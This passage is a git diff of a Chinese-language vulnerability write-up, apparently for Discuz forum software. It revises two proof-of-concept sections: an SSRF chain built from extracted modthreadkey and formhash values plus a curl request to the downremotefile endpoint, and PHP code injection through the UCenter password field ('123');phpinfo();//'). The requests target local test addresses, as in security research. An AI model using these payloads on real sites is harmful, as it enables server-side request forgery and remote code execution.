@@ -99,19 +99,19 @@ Poc
 http://172.17.0.2/forum.php?mod=redirect&goto=findpost&modthreadkey=1&ptid=1&pid=1
 ```
 
-在跳转后的页面URL：
+在跳转后的页面URL中包含modthreadkey参数，如：
 
 ```
 http://172.17.0.2/forum.php?mod=viewthread&tid=1&page=1&modthreadkey=c3564b479d72b05e136e62e2af4762c4#pid1
 ```
 
-包含modthreadkey参数，在跳转后的页面源码中包含formhash参数，
+在跳转后的页面源码中包含formhash参数，如：
 
 ```html
 <input type="hidden" name="formhash" value="7d96833f" />
 ```
 
-从控制台查看network获取当前cookie，构造SSRF触发链接
+从控制台查看network获取当前cookie，并利用上述获取的两个参数，构造SSRF触发链接：
 
 ```
 curl --cookie "获取的cookie" -d "a=a" "http://172.17.0.2/portal.php?mod=portalcp&ac=upload&aid=1&catid=1&op=downremotefile&formhash=7d96833f&modarticlekey=c3564b479d72b05e136e62e2af4762c4&content=%3Cimg%20src=http://172.17.0.1/test_ssrf%231.png%3E
@@ -137,7 +137,7 @@ curl --cookie "获取的cookie" -d "a=a" "http://172.17.0.2/portal.php?mod=porta
 
 Poc
 
-使用管理员账号登录后台，在 站长->UCenter设置 页面 修改UCenter 数据库账号为shell-test 密码为 123');phpinfo();//  （该账号已预先添加至测试环境），提交后刷新该设置页面即可。
+使用管理员账号登录后台，在 站长->UCenter设置 页面 修改UCenter 数据库账号为shell_test 密码为 123');phpinfo();//  （该账号已预先添加至测试环境），提交后刷新该设置页面即可。
 
 
 
